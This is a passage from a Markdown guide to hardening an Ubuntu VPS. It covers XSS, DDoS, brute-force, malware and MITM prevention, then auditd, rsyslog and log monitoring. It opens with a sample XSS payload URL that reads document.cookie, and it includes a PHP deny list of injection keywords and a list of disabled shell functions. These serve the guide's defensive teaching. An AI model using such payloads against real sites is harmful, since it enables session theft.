http://example.com#<img src=x onerror=alert(document.cookie)>
```

### Impact
- Cookie/session theft
- Keylogging
- Phishing attacks
- Malware distribution
- Website defacement
- Account takeover

---

### Prevention Strategies

#### 1. Output Encoding/Escaping
```php
// HTML context
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// JavaScript context
echo json_encode($user_input);

// URL context
echo urlencode($user_input);

// HTML attribute context
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

```javascript
// JavaScript escaping
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}
```

#### 2. Content Security Policy (CSP)
```nginx
# Nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'self'; base-uri 'self'; form-action 'self';" always;
```

```apache
# Apache
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';"
```

```html
<!-- Meta tag (less secure than header) -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

#### 3. Input Validation
```php
// Whitelist validation
if (!preg_match('/^[a-zA-Z0-9\s]+$/', $input)) {
    die("Invalid input");
}

// Reject dangerous patterns
$dangerous = ['<script', 'javascript:', 'onerror=', 'onclick='];
foreach ($dangerous as $pattern) {
    if (stripos($input, $pattern) !== false) {
        die("Potentially malicious input detected");
    }
}
```

#### 4. Use Template Engines with Auto-Escaping
```php
// Twig (auto-escapes by default)
{{ user_input }}

// Blade (Laravel)
{{ $user_input }}  // Auto-escaped
{!! $user_input !!}  // Raw output (use carefully)
```

```javascript
// React (auto-escapes)
<div>{userInput}</div>

// Vue.js (auto-escapes)
<div>{{ userInput }}</div>
```

#### 5. HTTPOnly and Secure Cookie Flags
```php
// PHP
setcookie("session", $value, [
    'httponly' => true,  // Prevent JavaScript access
    'secure' => true,    // Only over HTTPS
    'samesite' => 'Strict'  // CSRF protection
]);
```

```nginx
# Nginx
add_header Set-Cookie "session=value; HttpOnly; Secure; SameSite=Strict";
```

#### 6. X-XSS-Protection Header
```nginx
# Nginx (legacy browsers)
add_header X-XSS-Protection "1; mode=block" always;
```

#### 7. DOMPurify for Client-Side Sanitization
```javascript
// Include DOMPurify library
<script src="https://cdn.jsdelivr.net/npm/dompurify@latest/dist/purify.min.js"></script>

// Sanitize before inserting into DOM
const clean = DOMPurify.sanitize(dirty);
document.getElementById('output').innerHTML = clean;
```

---

## Attack Vector 3: Distributed Denial of Service (DDoS)

### What is DDoS?
DDoS attacks overwhelm servers with massive traffic from multiple sources (botnets), making services unavailable to legitimate users.

### Types of DDoS Attacks

#### Volume-Based Attacks
- UDP floods
- ICMP floods
- Amplification attacks (DNS, NTP)

#### Protocol Attacks
- SYN floods
- Fragmented packet attacks
- Ping of Death

#### Application Layer Attacks
- HTTP floods
- Slowloris
- RUDY (Slow POST)

### Impact
- Service downtime
- Revenue loss
- Reputation damage
- Resource exhaustion
- Increased operational costs

---

### Prevention and Mitigation Strategies

#### 1. Rate Limiting (Nginx)
```nginx
# Nginx rate limiting (already covered in Web Server section)
http {
    limit_req_zone $binary_remote_addr zone=general:10m rate=10r/s;
    limit_req_zone $binary_remote_addr zone=api:10m rate=5r/s;
    limit_conn_zone $binary_remote_addr zone=addr:10m;

    server {
        limit_req zone=general burst=20 nodelay;
        limit_conn addr 10;

        location /api {
            limit_req zone=api burst=5 nodelay;
        }
    }
}
```

#### 2. Connection Limits
```nginx
# Nginx
http {
    limit_conn_zone $binary_remote_addr zone=conn_limit:10m;

    server {
        limit_conn conn_limit 10;  # Max 10 concurrent connections per IP
    }
}
```

```apache
# Apache with mod_evasive (already covered)
DOSPageCount 2
DOSSiteCount 50
DOSBlockingPeriod 10
```

#### 3. SYN Flood Protection (Kernel Tuning)
```bash
# Edit sysctl.conf
sudo nano /etc/sysctl.conf
```

```bash
# SYN flood protection
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_max_syn_backlog = 2048
net.ipv4.tcp_synack_retries = 2
net.ipv4.tcp_syn_retries = 5

# IP spoofing protection
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1

# Ignore ICMP ping requests
net.ipv4.icmp_echo_ignore_all = 1

# Ignore broadcast requests
net.ipv4.icmp_echo_ignore_broadcasts = 1

# Bad error message protection
net.ipv4.icmp_ignore_bogus_error_responses = 1

# Log suspicious packets
net.ipv4.conf.all.log_martians = 1
net.ipv4.conf.default.log_martians = 1

# Apply settings
sudo sysctl -p
```

#### 4. Fail2ban DDoS Jail
```bash
sudo nano /etc/fail2ban/jail.local
```

```ini
[http-get-dos]
enabled = true
port = http,https
filter = http-get-dos
logpath = /var/log/nginx/access.log
maxretry = 300
findtime = 300
bantime = 600
action = iptables[name=HTTP, port=http, protocol=tcp]
```

Create filter:
```bash
sudo nano /etc/fail2ban/filter.d/http-get-dos.conf
```

```ini
[Definition]
failregex = ^<HOST> -.*"(GET|POST).*
ignoreregex =
```

#### 5. Cloud-Based DDoS Protection
For serious DDoS protection, use CDN/DDoS protection services:

- **Cloudflare** (free tier available)
- **AWS Shield**
- **Azure DDoS Protection**
- **Akamai**
- **Sucuri**

#### 6. iptables Rate Limiting
```bash
# Limit new connections per IP
sudo iptables -A INPUT -p tcp --dport 80 -m state --state NEW -m recent --set
sudo iptables -A INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 60 --hitcount 20 -j DROP

# Limit ICMP (ping) requests
sudo iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# Save rules
sudo netfilter-persistent save
```

#### 7. Optimize Backend Performance
```bash
# Increase kernel limits
sudo nano /etc/sysctl.conf
```

```bash
# Increase file descriptors
fs.file-max = 65535

# Increase network buffers
net.core.rmem_max = 16777216
net.core.wmem_max = 16777216
net.ipv4.tcp_rmem = 4096 87380 16777216
net.ipv4.tcp_wmem = 4096 65536 16777216

# Increase connection tracking
net.netfilter.nf_conntrack_max = 1000000
net.ipv4.netfilter.ip_conntrack_max = 1000000

# TIME_WAIT optimization
net.ipv4.tcp_fin_timeout = 15
net.ipv4.tcp_tw_reuse = 1

# Apply
sudo sysctl -p
```

#### 8. Application-Level Caching
```bash
# Install and configure caching
# Redis for session/data caching
sudo apt install redis-server -y

# Varnish for HTTP caching
sudo apt install varnish -y

# Enable Nginx caching
# (Already in web server configs)
```

---

## Attack Vector 4: Brute Force Attacks

### What are Brute Force Attacks?
Attackers systematically try many passwords or passphrases hoping to guess correctly.

### Prevention Strategies

#### 1. SSH Key Authentication (Already Covered)
```bash
# Disable password authentication
PasswordAuthentication no
```

#### 2. Fail2ban (Already Covered)
```ini
[sshd]
enabled = true
maxretry = 3
bantime = 3600
```

#### 3. Account Lockout Policy
```bash
# Install pam_faillock
sudo apt install libpam-pwquality -y

# Configure PAM
sudo nano /etc/pam.d/common-auth
```

```bash
# Add before pam_unix.so
auth required pam_faillock.so preauth silent audit deny=5 unlock_time=900

# Add after pam_unix.so
auth [default=die] pam_faillock.so authfail audit deny=5 unlock_time=900
auth sufficient pam_faillock.so authsucc audit deny=5 unlock_time=900
```

#### 4. Strong Password Policy (Already Covered)
```bash
# Enforce in /etc/security/pwquality.conf
minlen = 14
dcredit = -1
ucredit = -1
lcredit = -1
ocredit = -1
```

#### 5. CAPTCHA for Web Forms
```html
<!-- Google reCAPTCHA -->
<script src="https://www.google.com/recaptcha/api.js"></script>
<div class="g-recaptcha" data-sitekey="your_site_key"></div>
```

#### 6. Two-Factor Authentication (Already Covered)
```bash
# Google Authenticator for SSH
sudo apt install libpam-google-authenticator -y
```

---

## Attack Vector 5: Malware and Remote Code Execution

### Prevention Strategies

#### 1. File Upload Validation
```php
// PHP file upload security
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
$file_extension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($file_extension, $allowed_extensions)) {
    die("Invalid file type");
}

// Check MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];

if (!in_array($mime, $allowed_mimes)) {
    die("Invalid file type");
}

// Rename file
$safe_filename = hash('sha256', $original_name . time()) . '.' . $file_extension;

// Store outside web root
move_uploaded_file($_FILES['file']['tmp_name'], '/var/uploads/' . $safe_filename);
```

#### 2. Disable Dangerous PHP Functions
```bash
sudo nano /etc/php/8.1/fpm/php.ini
```

```ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```

#### 3. ClamAV Antivirus
```bash
# Install ClamAV
sudo apt install clamav clamav-daemon -y

# Update virus definitions
sudo freshclam

# Scan directory
sudo clamscan -r /var/www/

# Schedule daily scans
sudo crontab -e
# Add: 0 2 * * * /usr/bin/clamscan -r /var/www/ --log=/var/log/clamav/scan.log
```

#### 4. chroot Jail for Services
```bash
# Create chroot environment for specific services
# (Advanced - requires careful configuration)
```

---

## Attack Vector 6: Man-in-the-Middle (MITM)

### Prevention Strategies

#### 1. Enforce HTTPS Everywhere
```nginx
# Force HTTPS (already in configs)
server {
    listen 80;
    return 301 https://$server_name$request_uri;
}
```

#### 2. HSTS (Already Covered)
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

#### 3. Certificate Pinning
```nginx
# Public Key Pinning (deprecated, use Certificate Transparency)
# Modern approach: rely on Certificate Transparency logs
```

#### 4. Secure Database Connections
```php
// MySQL with SSL
$pdo = new PDO(
    "mysql:host=localhost;dbname=mydb",
    "username",
    "password",
    [PDO::MYSQL_ATTR_SSL_CA => '/path/to/ca-cert.pem']
);
```

---

## Attack Vector Summary and Checklist

### SQL Injection Prevention
- [ ] Use parameterized queries/prepared statements
- [ ] Implement input validation
- [ ] Use ORM frameworks
- [ ] Apply least privilege database access
- [ ] Deploy WAF (ModSecurity)
- [ ] Sanitize error messages

### XSS Prevention
- [ ] Output encoding/escaping
- [ ] Implement Content Security Policy
- [ ] Use auto-escaping template engines
- [ ] Set HTTPOnly and Secure cookie flags
- [ ] Input validation
- [ ] Use DOMPurify for client-side

### DDoS Prevention
- [ ] Implement rate limiting
- [ ] Configure connection limits
- [ ] Tune kernel parameters
- [ ] Deploy Fail2ban
- [ ] Consider cloud-based DDoS protection
- [ ] Optimize backend performance
- [ ] Implement caching

### Brute Force Prevention
- [ ] SSH key authentication
- [ ] Fail2ban configuration
- [ ] Account lockout policies
- [ ] Strong password requirements
- [ ] CAPTCHA on login forms
- [ ] Two-factor authentication

### Malware Prevention
- [ ] File upload validation
- [ ] Disable dangerous PHP functions
- [ ] Install ClamAV antivirus
- [ ] Regular security scanning
- [ ] chroot jails for services

### MITM Prevention
- [ ] Enforce HTTPS everywhere
- [ ] Implement HSTS
- [ ] Use secure database connections
- [ ] Monitor Certificate Transparency logs

---

## 10. Monitoring and Logging Best Practices

### Overview
"You cannot secure what you cannot see." Logging and monitoring are essential for detecting security incidents, troubleshooting issues, and maintaining compliance. This section covers comprehensive logging and monitoring strategies for Ubuntu VPS.

---

## Essential Log Files on Ubuntu

### System Authentication Logs
```bash
# Primary authentication log (SSH, sudo, login attempts)
/var/log/auth.log

# Failed login attempts (binary format)
/var/log/btmp

# Successful logins (binary format)
/var/log/wtmp

# Last login per user (binary format)
/var/log/lastlog

# Current logged-in users
/var/run/utmp
```

### System Logs
```bash
# General system messages
/var/log/syslog

# Kernel messages
/var/log/kern.log

# Boot messages
/var/log/boot.log

# Package management
/var/log/apt/history.log
/var/log/dpkg.log
```

### Web Server Logs
```bash
# Nginx
/var/log/nginx/access.log
/var/log/nginx/error.log

# Apache
/var/log/apache2/access.log
/var/log/apache2/error.log
```

### Security Tool Logs
```bash
# Fail2ban
/var/log/fail2ban.log

# UFW firewall
/var/log/ufw.log

# Audit daemon
/var/log/audit/audit.log

# ClamAV antivirus
/var/log/clamav/clamav.log
```

---

## Reading Log Files

### View Authentication Logs
```bash
# View all auth logs
sudo cat /var/log/auth.log

# Tail (follow) auth log in real-time
sudo tail -f /var/log/auth.log

# Last 100 lines
sudo tail -n 100 /var/log/auth.log

# Search for failed SSH attempts
sudo grep "Failed password" /var/log/auth.log

# Count failed login attempts per IP
sudo grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr

# View successful sudo commands
sudo grep "sudo:" /var/log/auth.log | grep "COMMAND"

# Check who logged in today
sudo grep "$(date '+%b %e')" /var/log/auth.log | grep "Accepted"
```

### View Binary Logs
```bash
# Last successful logins
last

# Last 10 logins
last -n 10

# Last logins for specific user
last username

# Failed login attempts
sudo lastb

# Last 20 failed attempts
sudo lastb -n 20

# Last login per user
sudo lastlog

# Currently logged in users
who
w
```

### Web Server Log Analysis
```bash
# Nginx access log - top 10 IPs
sudo awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head -10

# Top requested pages
sudo awk '{print $7}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head -10

# 404 errors
sudo grep " 404 " /var/log/nginx/access.log

# 500 errors
sudo grep " 500 " /var/log/nginx/error.log

# Requests from specific IP
sudo grep "203.0.113.50" /var/log/nginx/access.log

# Filter by date
sudo grep "$(date '+%d/%b/%Y')" /var/log/nginx/access.log
```

---

## Linux Audit System (auditd)

### Overview
Auditd provides comprehensive visibility into system calls, file access, and security-relevant events. Essential for compliance (PCI-DSS, HIPAA, SOC 2).

### Installation
```bash
# Install auditd
sudo apt install auditd audispd-plugins -y

# Start and enable
sudo systemctl start auditd
sudo systemctl enable auditd

# Check status
sudo systemctl status auditd
```

### Basic Configuration
```bash
# Edit audit rules
sudo nano /etc/audit/rules.d/audit.rules
```

### Essential Audit Rules

#### Monitor User and Group Changes
```bash
# Watch passwd file changes
-w /etc/passwd -p wa -k user_modification

# Watch group file changes
-w /etc/group -p wa -k group_modification

# Watch shadow file changes
-w /etc/shadow -p wa -k shadow_modification

# Watch sudoers file
-w /etc/sudoers -p wa -k sudoers_modification
-w /etc/sudoers.d/ -p wa -k sudoers_modification
```

#### Monitor Authentication Events
```bash
# PAM configuration changes
-w /etc/pam.d/ -p wa -k pam_modification

# SSH configuration changes
-w /etc/ssh/sshd_config -p wa -k sshd_config_change

# Login/logout monitoring
-w /var/log/lastlog -p wa -k login_logout
-w /var/run/faillock/ -p wa -k login_failures
```

#### Monitor Network Configuration
```bash
# Network configuration changes
-w /etc/network/ -p wa -k network_config
-w /etc/hosts -p wa -k hosts_modification
-w /etc/hostname -p wa -k hostname_change
-w /etc/resolv.conf -p wa -k dns_config
```

#### Monitor Kernel Module Loading
```bash
# Kernel module changes
-w /sbin/insmod -p x -k kernel_modules
-w /sbin/modprobe -p x -k kernel_modules
-w /sbin/rmmod -p x -k kernel_modules
-a always,exit -F arch=b64 -S init_module -S delete_module -k kernel_modules
```

#### Monitor File System Mounts
```bash
# Mount operations
-a always,exit -F arch=b64 -S mount -S umount2 -k mounts
```

#### Monitor Privileged Commands
```bash
# Sudo execution
-a always,exit -F arch=b64 -S execve -F euid=0 -F auid>=1000 -F auid!=4294967295 -k privileged_commands

# su execution
-w /bin/su -p x -k su_execution
```

#### Monitor Critical File Access
```bash
# Monitor sensitive directories
-w /var/www/ -p wa -k webroot_modification
-w /etc/letsencrypt/ -p wa -k ssl_cert_change
-w /root/ -p wa -k root_home_access
```

### Apply Audit Rules
```bash
# Reload audit rules
sudo augenrules --load

# Or restart auditd
sudo systemctl restart auditd

# Verify rules are loaded
sudo auditctl -l
```

### Query Audit Logs
```bash
# Search for events with key
sudo ausearch -k user_modification

# Search for events by user
sudo ausearch -ua username

# Search for failed events
sudo ausearch -m USER_LOGIN --success no

# Search by time range
sudo ausearch -ts today
sudo ausearch -ts 10:00:00 -te 11:00:00

# Search for specific file access
sudo ausearch -f /etc/passwd

# Generate report
sudo aureport

# Authentication report
sudo aureport -au

# Modifications report
sudo aureport -m

# Failed events report
sudo aureport --failed
```

---

## Centralized Logging with rsyslog

### Overview
Rsyslog is the default logging system on Ubuntu. It can collect logs from multiple sources and forward them to a central server.

### Configure Rsyslog

#### Send Logs to Central Server
```bash
# Edit rsyslog config
sudo nano /etc/rsyslog.conf
```

```bash
# Add at the end (TCP - reliable)
*.* @@log-server.example.com:514

# Or UDP (faster, less reliable)
*.* @log-server.example.com:514

# Send only auth logs
auth,authpriv.* @@log-server.example.com:514
```

#### Filter and Send Specific Logs
```bash
# Create custom config
sudo nano /etc/rsyslog.d/50-custom.conf
```

```bash
# Send SSH failures to remote server
:msg, contains, "Failed password" @@log-server.example.com:514

# Send all nginx errors
if $programname == 'nginx' and $syslogseverity <= 4 then @@log-server.example.com:514

# Send Fail2ban alerts
if $programname == 'fail2ban' then @@log-server.example.com:514
```

```bash
# Restart rsyslog
sudo systemctl restart rsyslog
```

#### Forward Audit Logs to Rsyslog
```bash
# Edit audisp syslog plugin
sudo nano /etc/audisp/plugins.d/syslog.conf
```

```bash
# Change to:
active = yes
direction = out
path = builtin_syslog
type = builtin
args = LOG_INFO
format = string
```

```bash
# Adjust audit log permissions
sudo usermod -aG adm syslog
sudo chmod 750 /var/log/audit
sudo chmod 640 /var/log/audit/audit.log

# Restart services
sudo systemctl restart auditd
sudo systemctl restart rsyslog
```

---

## Log Rotation

### Configure Log Rotation
```bash
# Rsyslog log rotation config
sudo nano /etc/logrotate.d/rsyslog
```

```bash
/var/log/syslog
/var/log/auth.log
{
    rotate 90        # Keep 90 days
    daily            # Rotate daily
    missingok        # Don't error if log missing
    notifempty       # Don't rotate empty logs
    delaycompress    # Delay compression for 1 cycle
    compress         # Compress old logs
    postrotate       # Command after rotation
        /usr/lib/rsyslog/rsyslog-rotate
    endscript
    sharedscripts    # Run postrotate once
}
```

### Nginx/Apache Log Rotation
```bash
sudo nano /etc/logrotate.d/nginx
```

```bash
/var/log/nginx/*.log {
    daily
    missingok
    rotate 52        # Keep 52 days
    compress
    delaycompress
    notifempty
    create 0640 www-data adm
    sharedscripts
    postrotate
        if [ -f /var/run/nginx.pid ]; then
            kill -USR1 `cat /var/run/nginx.pid`
        fi
    endscript
}
```

### Test Log Rotation
```bash
# Test rotation (dry run)
sudo logrotate -d /etc/logrotate.d/rsyslog

# Force rotation
sudo logrotate -f /etc/logrotate.d/rsyslog
```

---

## Log Monitoring and Alerting

### Real-Time Log Monitoring with tail
```bash
# Monitor multiple logs simultaneously
sudo tail -f /var/log/auth.log /var/log/nginx/error.log /var/log/fail2ban.log

# With multitail (install first)
sudo apt install multitail -y
sudo multitail /var/log/auth.log /var/log/syslog /var/log/nginx/access.log
```

### Log Analysis with GoAccess (Web Server)
```bash
# Install GoAccess
sudo apt install goaccess -y

# Analyze Nginx logs (real-time)
sudo goaccess /var/log/nginx/access.log -c

# Generate HTML report
sudo goaccess /var/log/nginx/access.log -o /var/www/html/report.html --log-format=COMBINED

# Real-time dashboard
sudo goaccess /var/log/nginx/access.log -o /var/www/html/report.html --log-format=COMBINED --real-time-html
```

### Email Alerts with logwatch
```bash
# Install logwatch
sudo apt install logwatch -y

# Configure
sudo nano /etc/logwatch/conf/logwatch.conf
```

```bash
# Email settings
MailTo = your-email@example.com
MailFrom = logwatch@yourdomain.com
Detail = Med
Range = yesterday
Service = All
```

```bash
# Test logwatch
sudo logwatch --detail Med --range today --service sshd

# Schedule daily email (already in cron)
# Runs daily via /etc/cron.daily/00logwatch
```

### Custom Alert Script
```bash
# Create alert script
sudo nano /usr/local/bin/security-alerts.sh
```

```bash
#!/bin/bash

LOG_FILE="/var/log/auth.log"
ALERT_EMAIL="admin@yourdomain.com"
THRESHOLD=5

# Count failed SSH attempts in last hour
FAILED_ATTEMPTS=$(grep "Failed password" $LOG_FILE | grep "$(date '+%b %e %H')" | wc -l)

if [ $FAILED_ATTEMPTS -gt $THRESHOLD ]; then
    echo "WARNING: $FAILED_ATTEMPTS failed SSH attempts in the last hour" | \
    mail -s "Security Alert: Multiple Failed SSH Attempts" $ALERT_EMAIL
fi

# Check for new sudo users
NEW_SUDO=$(grep "$(date '+%b %e')" /var/log/auth.log | grep "usermod.*sudo")
if [ ! -z "$NEW_SUDO" ]; then
    echo "WARNING: Sudo privileges granted:\n$NEW_SUDO" | \
    mail -s "Security Alert: Sudo User Added" $ALERT_EMAIL
fi
```

```bash
# Make executable
sudo chmod +x /usr/local/bin/security-alerts.sh

# Add to cron (hourly)
sudo crontab -e
# Add: 0 * * * * /usr/local/bin/security-alerts.sh
```

---

## Security Monitoring Best Practices

### 1. Secure Log Files
```bash
# Set proper permissions
sudo chmod 640 /var/log/auth.log
sudo chmod 640 /var/log/syslog
sudo chown syslog:adm /var/log/syslog

# Protect audit logs
sudo chmod 600 /var/log/audit/audit.log
```

### 2. Centralize Logs
- Send logs to remote server (prevents tampering)
- Use encrypted transport (TLS)
- Immutable log storage
- Adequate retention period (90 days minimum, 1 year for compliance)

### 3. Monitor These Events
- [ ] Failed login attempts
- [ ] Successful root/sudo access
- [ ] New user creation
- [ ] User privilege escalation
- [ ] SSH key changes
- [ ] Firewall rule modifications
- [ ] Critical file modifications
- [ ] Unusual network connections
- [ ] Service start/stop
- [ ] Large file transfers

### 4. Regular Log Review
```bash
# Daily checks
- Review failed login attempts
- Check sudo usage
- Verify firewall blocks
- Monitor resource usage

# Weekly checks
- Analyze web server traffic patterns
- Review audit reports
- Check for vulnerabilities
- Verify backup integrity

# Monthly checks
- Full security audit
- Update security policies
- Test incident response procedures
- Review access controls
```

### 5. Compliance Retention
```bash
# Retention periods by standard
PCI-DSS: 1 year (3 months online)
HIPAA: 6 years
SOX: 7 years
GDPR: Based on data processing agreement
```

---

## Advanced Monitoring Tools

### 1. OSSEC / Wazuh (Host-Based IDS)
```bash
# Install Wazuh agent
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo apt-key add -
echo "deb https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee /etc/apt/sources.list.d/wazuh.list
sudo apt update
sudo apt install wazuh-agent -y

# Configure to connect to Wazuh manager
sudo nano /var/ossec/etc/ossec.conf
# Add manager IP and configure

# Start agent
sudo systemctl start wazuh-agent
```

### 2. Prometheus + Grafana (Metrics)
```bash
# Install node_exporter for system metrics
wget https://github.com/prometheus/node_exporter/releases/latest
tar xvfz node_exporter-*.tar.gz
sudo cp node_exporter-*/node_exporter /usr/local/bin/
sudo useradd -rs /bin/false node_exporter

# Create systemd service
# (Configuration beyond scope - see Prometheus documentation)
```

### 3. ELK Stack (Elasticsearch, Logstash, Kibana)
For large-scale deployments with centralized log analysis, dashboards, and alerting.

---

## Monitoring Checklist

### Daily Monitoring
- [ ] Check failed login attempts
- [ ] Review Fail2ban blocks
- [ ] Monitor disk space
- [ ] Check service status
- [ ] Review web server errors

### Weekly Monitoring
- [ ] Analyze traffic patterns
- [ ] Review audit logs
- [ ] Check for security updates
- [ ] Verify backups
- [ ] Review firewall logs

### Monthly Monitoring
- [ ] Full security audit
- [ ] Vulnerability scanning
- [ ] Access control review
- [ ] Log retention verification
- [ ] Incident response drill

---

## Conclusion

### Security Hardening Summary

This comprehensive guide covered:

1. **Initial Setup**: System updates, hostname, timezone
2. **User Management**: Non-root sudo user, password policies
3. **SSH Hardening**: Key-based auth, port changes, protocol restrictions
4. **Firewall**: UFW configuration with default-deny policy
5. **Intrusion Prevention**: Fail2ban for automated blocking
6. **Automatic Updates**: Unattended-upgrades for security patches
7. **SSL/HTTPS**: Let's Encrypt certificates, TLS 1.2/1.3
8. **Web Server Security**: Nginx/Apache hardening, ModSecurity WAF
9. **Attack Prevention**: SQL injection, XSS, DDoS, brute force
10. **Monitoring**: auditd, rsyslog, log analysis, alerting

### Final Security Checklist

#### System Level
- [ ] System fully updated
- [ ] Non-root user with sudo created
- [ ] Root login disabled
- [ ] SSH hardened (keys only, non-standard port)
- [ ] UFW firewall enabled with minimal rules
- [ ] Fail2ban active and configured
- [ ] Automatic security updates enabled
- [ ] Strong password policy enforced

#### Network Level
- [ ] Only required ports open
- [ ] Rate limiting configured
- [ ] DDoS protection in place
- [ ] HTTPS enforced everywhere
- [ ] HSTS headers set
- [ ] Modern TLS protocols only

#### Application Level
- [ ] Web server hardened
- [ ] Security headers implemented
- [ ] ModSecurity WAF deployed
- [ ] Input validation on all forms
- [ ] Output encoding for XSS prevention
- [ ] Parameterized queries for SQL
- [ ] File upload restrictions
- [ ] Error messages sanitized

#### Monitoring Level
- [ ] auditd configured and running
- [ ] Centralized logging set up
- [ ] Log rotation configured
- [ ] Alerts configured for critical events
- [ ] Regular log review scheduled
- [ ] Intrusion detection active

### Ongoing Maintenance

Security is not a one-time task but an ongoing process:

1. **Daily**: Monitor logs, check alerts
2. **Weekly**: Review security events, update software
3. **Monthly**: Full security audit, vulnerability scan
4. **Quarterly**: Penetration testing, policy review
5. **Annually**: Complete security assessment, disaster recovery drill

### Testing Your Security

```bash
# SSL/TLS testing
https://www.ssllabs.com/ssltest/

# Security headers
https://securityheaders.com/

# Vulnerability scanning (on your own server)
sudo apt install nmap -y
nmap -sV -O localhost

# Web vulnerability scanning
sudo apt install nikto -y
nikto -h https://yourdomain.com

# Check for open ports
sudo netstat -tulpn
sudo ss -tulpn
```

### Additional Resources

- Ubuntu Security Documentation: https://ubuntu.com/security
- CIS Benchmarks: https://www.cisecurity.org/cis-benchmarks/
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
- Mozilla Security Guidelines: https://infosec.mozilla.org/guidelines/

### Emergency Response

If you suspect a compromise:

1. **Isolate**: Disconnect from network (UFW deny all)
2. **Assess**: Review logs for intrusion indicators
3. **Contain**: Stop affected services
4. **Eradicate**: Remove malicious files/accounts
5. **Recover**: Restore from clean backup
6. **Learn**: Document incident, update procedures

### Final Notes

- **Defense in Depth**: Layer multiple security controls
- **Least Privilege**: Grant minimum necessary access
- **Regular Updates**: Keep all software current
- **Monitor Everything**: You can't protect what you can't see
- **Test Regularly**: Verify security controls work
- **Document**: Keep security documentation current
- **Backup**: Maintain regular, tested backups
- **Stay Informed**: Follow security news and advisories

---

**Document Version**: 1.0
**Last Updated**: 2025-12-22
**Target Ubuntu Version**: 20.04 LTS, 22.04 LTS, 24.04 LTS

---

This guide provides practical, production-ready security hardening for Ubuntu VPS deployments. Remember: security is a journey, not a destination. Stay vigilant, keep learning, and regularly review and update your security posture.
